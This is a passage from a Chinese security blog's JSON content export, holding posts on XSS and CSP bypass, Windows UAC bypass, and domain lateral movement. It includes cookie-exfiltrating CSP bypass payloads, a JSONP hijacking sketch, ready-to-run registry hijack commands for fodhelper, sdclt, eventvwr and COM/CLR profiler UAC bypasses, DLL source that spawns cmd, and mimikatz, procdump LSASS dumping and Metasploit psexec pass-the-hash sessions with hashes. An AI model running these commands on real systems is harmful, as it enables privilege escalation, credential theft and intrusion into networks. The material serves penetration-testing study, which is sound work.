把上面那个脚本改改就能实现ssrf了","categories":[],"tags":[{"name":"外围打点","slug":"外围打点","permalink":"http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"}]},{"title":"XSS的一些基本概念","slug":"重温XSS","date":"2021-06-28T13:52:13.409Z","updated":"2021-06-28T13:40:58.776Z","comments":true,"path":"2021/06/28/重温XSS/","link":"","permalink":"http://const27.com/2021/06/28/%E9%87%8D%E6%B8%A9XSS/","excerpt":"","text":"同源策略与跨域同源策略同源的定义若两个URL 协议，端口，host都相同，则这两个URL同源。这个方案叫做“协议/主机/端口元组”，或者直接是 “元组” 同源策略又分为DOM同源策略(禁止对不同源的页面的DOM进行操作)和XMLHttpRequest(禁止XHR对象项不同源的服务器地址发起HTTP请求)同源策略 同源策略的作用限制一个JS脚本对不同源的URL进行操作。 这么说可能会有点抽象，那不如看看下面的例子: 1.如果没有DOM同源策略，就意味着一个页面可以对任意页面的DOM进行操作。那么就会导致以下安全问题:做一个假网站，并插入一个占满全页面的iframe指向一个登陆界面如银行登录界面。用户进来后会发现除了域名不同，其他都和正常的银行登陆界面一致。若用户输入了账号密码，那么我们就可以跨域读取到银行登陆界面的dom树，从而读取用户输入的账号密码。 2.如果没有XMLHttpRequest，就意味着可以一个页面可以向任意页面发起HTTP请求。那么就会导致以下安全问题:当一个用户登陆了某个系统，如银行个人系统，此时银行网站会给用户返回cookie。如果用户此时访问了我们的恶意网站，就会执行我们恶意网站中的恶意AJAX代码，此AJAX代码会向银行网站发起HTTP请求，比如发起查询账户余额的请求（此时会默认附带用户的cookie）。银行页面发现cookie无误，就会返回请求的数据:账户余额，造成数据泄露。 跨域上面我们说了同源策略中，一个页面不能对不同源的页面进行操作。但是在实际情况中，还是有一些js标签能摆脱这种束缚,如script标签就能通过src属性获取不同源页面上的js代码，iframe能嵌入不同源站点的资源等等。这样的标签有如下 &lt;script src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;script&gt;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;...&quot;&gt;&lt;img&gt; &#x2F; &lt;video&gt; &#x2F; &lt;audio&gt;&lt;object&gt; &lt;embed&gt; 和 &lt;applet&gt; 的插件@font-face&lt;frame&gt; 和 &lt;iframe&gt; 但仅仅是这样，有些时候还是无法达到业务的需求，我们有时需要突破这种限制来达到业务需求，也就是避开同源策略，以下是几种解决方案。 CORSCORS，即跨域资源共享，它是一个W3C标准，定义了必须访问跨域资源时，浏览器和服务器该如何协商。其实质就是以AJAX为载体，使用自定义HTTP头让浏览器与服务器进行协商，从而决定跨域请求是否应该成功。所以实现CORS通信的关键是服务器是否实现了CORS接口。 另外，并不是所有浏览器都支持CORS，比如IE6,IE7,Opera min 不支持CORS。 实现原理浏览器把CORS的请求分成两类:简单请求与非简单请求 简单请求:满足以下条件，即为简单请求 请求方法是以下三种方法之一：HEADGETPOST且HTTP的头信息不超出以下几种字段：AcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Type：只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain 只要不满足以上条件，都为非简单请求。 对于简单请求，其实现原理如下: 1.在请求头中加一个额外头:Origin, 其包含发出请求的页面的协议，域名，端口，服务器以此来判断是否给予响应。2.服务器收到请求后，判别该Origin指向的站点能否跨域。若能跨域，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）；若不能跨域，则没有这个头部或者源信息不匹配（即Access-Control-Allow-Origin内容非*且与Origin不符）3.同时如果服务器返回的头中有 Access-Control-Allow-Credentials: true ，则说明可以跨域向服务器发送带有cookie的HTTP请求。 对于非简单请求，它会实现进行预检，其原理如下:1.进行预检，以OPTIONS方法向服务器发送Origin头部，Access-Control-Request-Method头部（接下来的请求方法，如POST），Access-Control-Request-Headers（自定义头部信息，可选）2.服务器响应，有如下头:Access-Control-Allow-Origin,Access-Control-Allow-Methods(允许的请求方法)，Access-Control-Allow-Headers（允许的自定义头部信息），Access-Control-Max-Age（应该将预检请求缓存多长时间，以秒为单位）3.通过预检请求后，以后每次浏览器的CORS请求都会和简单请求一样。 JSONP我们不妨通过一个例子来窥视JSONP的实现原理。 我们有如下文件test.html &lt;html&gt; &lt;head&gt;&lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;HI&lt;&#x2F;h1&gt; &lt;script&gt; var fun1&#x3D;function(data)&#123; alert(data) &#125; &lt;&#x2F;script&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;192.168.111.1&#x2F;a.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 其包含的a.js如下 fun1(&quot;remote data&quot;); 访问test.html，成功触发弹窗，我们将test.html中的fun1函数称为回调函数 于是就出现了利用这种原理来实现跨域传输数据的方法：JSONP 下面说说JSONP的具体实现流程: 客户端:1.定义获取数据后的回调函数2.动态生成服务端JS进行引用的代码 关于此处第2点，我们可以说道说道。我们再用这个方法实现跨域时，怎么让远程JS知道我们本地的回调函数叫什么名字？这就需要通过一些手段动态生成服务端的JS代码了。比如我们可以通过get参数来控制其返回的本地回调函数名，如: http:&#x2F;&#x2F;a.com?callback&#x3D;fun1 服务端:返回由回调函数名包裹的JSON数据，如 fun1(&#123; &quot;key1&quot;:&quot;value1&quot;&#125;); 这里为什么要特别强调是JSON呢？因为JSON不仅可以简洁的表述复杂的数据，而且JS原生支持JSON，可以在客户端自由处理JSON数据，所以服务端多传回JSON数据，JSONP这个名字也是这么来的。 CSPCSP，即内容安全策略。它通过白名单策略，告诉客户端哪些外部资源可以加载和执行。同时需要注意的是，CSP目前有1.0 2.0 3.0 版本，每个版本的规则都有不同 CSP规则CSP通过定义一系列规则来实现安全管理。 首先我们来看看一条CSP规则的范例 Content-Security-Policy: default-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com; frame-src &#39;none&#39;; object-src &#39;none&#39;多个CSP指令间用分号隔开，多个指令值之间用空格隔开 下面是各个指令及其指令值的效果 摘自https://blog.csdn.net/qq_37943295/article/details/79978761 启用CSP那么如何启用CSP呢？有两种方式 1.在HTTP头添加在HTTP头响应添加content-security-policy头并写入CSP规则以后，就能启用CSP了 图引用于http://www.ruanyifeng.com/blog/2016/09/csp.html 2.在meta标签里添加向内添加如下内容 &lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;即可 一些其他XSS保护机制X-FrameX-Frame-Options 是一个响应头，指定此页面能否在&lt;frame&gt;或者&lt;iframe&gt;中插入.他有三个可选值: DENY 页面不能被嵌入到任何iframe或frame中 SAMEORIGIN 页面只能被本站页面嵌入到iframe或者frame中 ALLOW-FROM uri 表示该页面可以在指定来源的 frame 中展示。 XSS auditorhttponlyhttponly 是一个针对cookie的保护机制。其实现原理是在response中对某一项cookie设置为HTTPONLY=true，从而使该cookie不能被document.cookie 读取。 我们随便找个网站，发现其captch_session_v2开启了httponly 随后我们通过document.cookie尝试去读取aptch_session_v2的值，发现其值并没有出现在返回内容中 htmlspecialcharshtmlspecialchars是一个php函数，它可以将一些敏感字符转义 &amp; (AND) &#x3D;&gt; &amp;&quot; (双引号) &#x3D;&gt; &quot; (当ENT_NOQUOTES没有设置的时候) &#39; (单引号) &#x3D;&gt; &amp;#039; (当ENT_QUOTES设置) &lt; (小于号) &#x3D;&gt; &lt; &gt; (大于号) &#x3D;&gt; &gt; 攻击手段bypass cspcsp，是可以被bypass的。我们接下来就想办法bypass csp来回传cookie 1 default-src &#39;none&#39;; 可以通过meta标签实现重定向 &lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.xxx.com&#x2F;x.php?cookie&#x3D;[cookie]&quot;&gt; 即，1秒后跳转至指定url 2 script-src ‘self’ ‘unsafe-inline’ 开放了内联脚本。我们可以通过window.location,windows.open或者meta标签实现页面跳转。也可以通过动态创建元素实现跳转 var a &#x3D; document.createElement(&quot;a&quot;);a.href&#x3D;&#39;http:&#x2F;&#x2F;www.baidu.com&#39;+document.cookie;a.click(); 3 default-src &#39;self&#39;; script-src &#39;self&#39; 限制了只能加载本域JS脚本，同时禁止了内联脚本执行。不过问题不大，如果我们有一个上传点，我们可以上传一个恶意JS文件，上传后如果我们知道此JS文件上传位置与文件名且上传的位置是本域，然后通过XSS实现加载此恶意JS文件。 另外在CSP1.0版本中，还可以通过以下方式进行跳转(现在不咋好用了) &lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; (H5预加载)&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; （DNS预加载） 4 script-src http:&#x2F;&#x2F;www.a.com&#x2F;b&#x2F; 限制了只能从某特定路径去加载JS脚本对此一般的解决方法是看看此目录下有没有可控重定向的文件，比如这种 b&#x2F;302.php&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt; 我们就可以插入 &lt;script src&#x3D;&quot;b&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;a.com&#x2F;upload&#x2F;a.js&quot;&gt; &lt;&#x2F;script&gt; 去加载我们上传的JS脚本（上传点自己找） JSONP 劫持简单说一说 首先存在网站B，它包含登录用户的ID,passwd等敏感信息。且有页面http://B.com/user?callback= 用来进行JSONP跨域数据传输ID,PASSWD等信息，这是前提。用户登录B后，打开了我们的恶意网站A.com,A.com的内容为: &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;B.com&#x2F;user?jsonp&#x3D;Callback&quot;&gt;&lt;&#x2F;script&gt;function Callback(result)&#123; 将获取内容上传至恶意服务器的JS代码.....&#125; 那么A网站就会向网站B跨域请求到敏感信息，并上传到恶意服务器保存。这就是JSONP劫持，此方法常用于水坑攻击 常用触发点与bypasshttps://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html","categories":[],"tags":[{"name":"外围打点","slug":"外围打点","permalink":"http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"}]},{"title":"BypassUAC技术总结","slug":"Bypass UAC","date":"2021-06-28T13:52:05.780Z","updated":"2021-06-28T13:40:35.984Z","comments":true,"path":"2021/06/28/Bypass UAC/","link":"","permalink":"http://const27.com/2021/06/28/Bypass%20UAC/","excerpt":"","text":"UAC用户帐户控制（User Account Control，简写作UAC)是微软公司在其[Windows Vista](https://baike.baidu.com/item/Windows Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。 点击“是”，管理员就会提升到高权限再去运行该任务。 autoElevate与requestedExecutionLevelautoElevate当某个EXE文件的文件清单里有&lt;autoElevate&gt; 元素时，当执行该文件时会默认提权执行。我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。适用范围:管理员权限以获得，要得到高权限管理员权限 一般用工具sigcheck检测 网上常拿C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe 举列子 这个东西很有用，是下面部分方法的前提条件 requestedExecutionLevel 有三个不同的参数：asInvoker requireAdministrator highestAvailable 分别对应应用程序以什么权限运行 asInvoker：父进程是什么权限，此应用程序就是什么权限 requireAdministrator：需要以管理员权限来运行，此类应用程序图标右下方会有个盾牌标记 highestAvailable：此程序以当前用户能获取到的最高权限运行。当你在管理员账户下运行此程序就会要求权限提升以及弹出UAC框。当你在标准账户下运行此程序，由于此账户的最高权限就是标准账户，所以双击便运行 白名单程序除了刚刚说的autoelevate，还有一类叫白名单程序的应用程序也是打开默认提权的。如服务管理工具下的许多应用都属于白名单程序，而其中又有些程序执行时需要依赖CLR支持（如事件查看器，任务计划程序） Bypass UACDLL劫持reference:https://www.anquanke.com/post/id/209033https://www.cnblogs.com/0daybug/p/11719541.html exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是 程序所在目录 系统目录即SYSTEM32目录 16位系统目录即SYSTEM目录 Windows目录 程序加载目录(SetCurrentDirecctory) PATH环境变量中列出的目录 同时，dll加载也遵循着Know DLLs注册表项的机制：Know DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLS处可以看见这些dll 在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。 如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径： （1） DLL替换：用恶意的DLL替换掉合法的DLL（2） DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的恶意DLL替换为合法的DLL。此方法通常也被称为DLL侧加载（6） 相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。 实践出真知1这里我们先用第一种方法来进行实验，实验对象是C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。 由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口 bypassuac成功。 当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，这种洞该怎么去找。 实践出真知2这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。 我们process monitor设置过滤如下 cmd运行 mmc eventvwr.msc,查看调用 dll搜索顺序确实是 程序目录-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）-&gt;PATH目录。 我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行 但是无奈我这里环境是win7 sp1,但是这个洞7600才出现，所以复现不了了。但大概思路就是这样的 CLR加载任意DLLCLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。 至于这个dll如何给CLR，是通过修改以下环境变量实现的 COR_ENABLE_PROFILING &#x3D; 1COR_PROFILER&#x3D;&#123;CLSIDor ProgID&#125; CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。 接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径. 然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system(“cmd.exe”) 那么就会蹦出来高权限cmd窗口 REG ADD &quot;HKCU\\Software\\Classes\\CLSID\\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\\InprocServer32&quot; &#x2F;ve &#x2F;t REG_EXPAND_SZ &#x2F;d &quot;C:\\test\\calc.dll&quot; &#x2F;fREG ADD &quot;HKCU\\Environment&quot; &#x2F;v &quot;COR_PROFILER&quot; &#x2F;t REG_SZ &#x2F;d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; &#x2F;fREG ADD &quot;HKCU\\Environment&quot; &#x2F;v &quot;COR_ENABLE_PROFILING&quot; &#x2F;t REG_SZ &#x2F;d &quot;1&quot; &#x2F;fmmc gpedit.msc 但我死活复现不起不知道为啥，我的dll这样写的 &#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)&#123; char cmd[] &#x3D; &quot;cmd.exe&quot;; switch (fdwReason) &#123; case DLL_PROCESS_ATTACH: WinExec(cmd, SW_SHOWNORMAL); ExitProcess(0); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 另外的，你还可以为COR_PROFILER_PATH设置为如\\\\server\\share\\test.dll的smb的路径，这样也可以实现bypassuac（没复现） 白名单程序odbcad32.exe这个方法很简单。打开C:\\Windows\\system32\\odbcad32.exe，然后通过以下方法打开powershell或者cmd 成功bypass 管理工具之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例 操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell 以此内推，还有很多相似的管理工具可以这样利用 注册表劫持Fodhelper.exeFodhelper.exe win10才有，所以只有win10能通过这个办法bypassuac，他是一个autoelevate元素程序 我们使用proceemonitor查看事件查看器启动的时候执行了什么。我们通过排查发现了此处 发现程序试图打开HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command，但是这个项没有找到，因为这个项并不存在，于是它查询 HKCR\\ms-settings\\Shell\\Open,查询成功便打开其下的Command键进行查询。我们可以劫持注册表，往HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command写入恶意指令从而达到bypassuac的目的。 reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command &#x2F;d C:\\Windows\\System32\\cmd.exe &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command &#x2F;v DelegateExecute &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f 我们写入如下命令，就能让Fodhelper.exe 执行时自动高权限执行cmd窗口了 然后消除痕迹 reg delete &quot;HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command&quot; sdcltWin10后这个程序才有自动提升权限的能力 reg add &quot;HKCU\\Software\\Classes\\Folder\\shell\\open\\command&quot; &#x2F;d C:\\Windows\\System32\\cmd.exe &#x2F;f reg add &quot;HKCU\\Software\\Classes\\Folder\\shell\\open\\command&quot; &#x2F;v &quot;DelegateExecute&quot; &#x2F;f eventvmrreg add &quot;HKCU\\Software\\Classes\\mscfile\\shell\\open\\command&quot; &#x2F;d C:\\Windows\\System32\\cmd.exe &#x2F;f win10，win7均无效,不知道是哪个版本的事了，反正记录下来吧。 COM劫持和dll劫持类似，应用程序在运行时也会去加载指定CLSID的COM组件，其加载顺序如下 HKCU\\Software\\Classes\\CLSIDHKCR\\CLSIDHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Objects\\ 以eventvwr为例 执行该程序时会去寻找{0A29FF9E-7F9C-4437-8B11-F424491E3931}这个组件，这个组件又需要加载InProcServer32指定的DLL，而这个DLL的路径可由用户定义。 而eventvwr的这个组件一般在HKCR\\CLSID找到，所以可以搜索路径劫持。 利用以下方法可以劫持（搜索路径劫持） reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\InProcServer32 &#x2F;v &quot;&quot; &#x2F;t REG_SZ &#x2F;d &quot;d:\\msf_x64.dll&quot; &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\InProcServer32 &#x2F;v &quot;LoadWithoutCOM&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\InProcServer32 &#x2F;v &quot;ThreadingModel&quot; &#x2F;t REG_SZ &#x2F;d &quot;Apartment&quot; &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\ShellFolder &#x2F;v &quot;HideOnDesktop&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\ShellFolder &#x2F;v &quot;Attributes&quot; &#x2F;t REG_DWORD &#x2F;d 0xf090013d &#x2F;f 利用com接口ICMLuaUtil UACME一个开源项目，记录了许多Bypassuac的方法。 https://github.com/hfiref0x/UACME/tree/v3.2.x windbg调试","categories":[],"tags":[{"name":"提权","slug":"提权","permalink":"http://const27.com/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"横向移动与域控权限维持方法总汇","slug":"横向移动与域控权限维持方法总汇","date":"2021-06-28T13:51:58.227Z","updated":"2021-06-28T13:38:37.877Z","comments":true,"path":"2021/06/28/横向移动与域控权限维持方法总汇/","link":"","permalink":"http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/","excerpt":"","text":"横向移动PTH如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了其中若hash加密方式是 rc4 ，那么就是pass the hash若加密方式是aes key,那么就是pass the key注意NTLM和kerberos协议均存在PTH:NTLM自然不用多说kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响 那前提就是要获取hash值了 HASH获取1.使用meterpreter里的mimikatz模块 meterpreter&gt;load mimikatzmeterpreter&gt;mimikatz_command -f mimikatz的指令privilege::debug 提权 samdump::hashes dump哈希 或者meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst 2.使用meterpreter自带的hash获取模块 meterpreter&gt;hashdumpmeterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump (推荐使用这个) 3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可 4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希 procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash procdump64.exe -accepteula -ma lsass.exe lsass.dmp 执行该指令，获取到lsass.dmp然后将其传回本地通过mimikatz.exe分别执行以下命令&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; Procdump：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdumpmimikatz：https://github.com/gentilkiwi/mimikatz/releases 5.使用cobalt strike 获取hash beacon&gt;hashdumpbeacon&gt;mimikatz mimikatz指令 6.利用sam表 mimikatz在线读sam表中的hash privilege::debugtoken::elevatelsadump::sam 将sam表下载到本地由mimikatz分析 reg save HKLM\\SYSTEM SYSTEMreg save HKLM\\SAM SAM在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析mimikatz运行mimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEMDomain : STU1SysKey : fd4639f4e27c79683ae9fee56b44393fLocal SID : S-1-5-21-1982601180-2087634876-2293013296SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17RID : 000001f4 (500)User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0RID : 000001f5 (501)User : GuestRID : 000003e8 (1000)User : liukaifeng01 Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 hash 传递攻击 PTH （Pass the Hash)1.msf里使用psexec模块 msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec &#x2F;&#x2F;以root启动msf[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133lhsot &#x3D;&gt; 192.168.64.133msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133lhost &#x3D;&gt; 192.168.64.133msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443lport &#x3D;&gt; 443msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138rhost &#x3D;&gt; 192.168.52.138msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser AdministratorSMBUser &#x3D;&gt; Administratormsf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5 &#x2F;&#x2F;一般选择NTLM HASHSMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run 2.使用mimikatz 我们在目标机里放置mimikatz.exe 然后执行以下命令 sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc &#x2F;&#x2F;自行修改 之后便会弹出一个cmd窗口，在这个窗口里链接机器即可 net use \\\\192.168.222.131\\c$ 3.使用cobalt strike 在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。 MS14-068这个洞的危害很大，可以让任意域用户提权到域管。适用版本: server 2000以上补丁: kb3011780 PACPAC是kerberos协议里用来解决用户权限功能所设计出的东西。在kerberos协议里面，一个用户用自己的hash拿到了TGT，接着凭借着TGT拿到了TGS，接着用TGS去访问服务。看似只要hash正确，用户就能到处访问服务，但是所有服务都可以给这个用户所访问吗？肯定是不行的，所以微软在kerberos为了实现用户权限分级，采用了PAC。PAC被设计为存在于TGT里面。完整的kerberos权限验证流程如下。 1。用户凭借自己的hash加密时间戳并发送明文用户名到KDC，KDC认证用户成功后返回被krbtgt用户hash加密的TGT(内有ticekt包含着PAC)，以及用户自身hash加密的login session key 2.用户凭借TGT票据向KDC发起指定服务的TGS_REQ。KDC用krbtgt hash解密，若解密成功则直接返回服务hash加密的TGS（这里并没考虑用户的权限，直接返回了TGS） 3.用户用TGS向服务发起请求，服务用自己的hash解密TGS后获得PAC，拿着PAC向KDC询问该用户是否有权限访问。KDC拿到PAC后再次解密，得到了PAC里的 用户的sid，以及所在的组，再判断用户是否有访问服务的权限（有些服务不会验证KDC，这样就会导致白银票据攻击) PAC自身的结构 PAC在Ticket中的结构 又这个图可以知道,PAC只不过是ticket里Authorization DATA的一个分支。而Authorization data的结构是这样的 AuthorizationData ::= SEQUENCE OF SEQUENCE {ad-type [0] Int32,ad-data [1] OCTET STRING } ad-type中就有这么一个类型 AD-IF-RELEVANT 对应数字1,由上上图可知这是PAC的外壳。若类型为 AD-IF-RELEVAN ,那么ad-data也是一个 AuthorizationData类型的结构体，也有ad-type 和ad-data.那么这个外壳ad-data的ad-type就是次外壳AD-WIN2K-PAC 了,与 AD-WIN2K-PAC 这个ad-type对应的ad-data就是一段连续空间。 这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER 。PACTYPE包含的是 cBuffers,版本以及缓冲区 。PAC_INFO_BUFFER是key-value型的。PAC_INFO_BUFFER的key有很多 0x00000001 登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。 0x00000002 凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。 0x00000006 服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。 0x00000007 KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。 0x0000000A 客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。 0x0000000B 受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。 0x0000000C 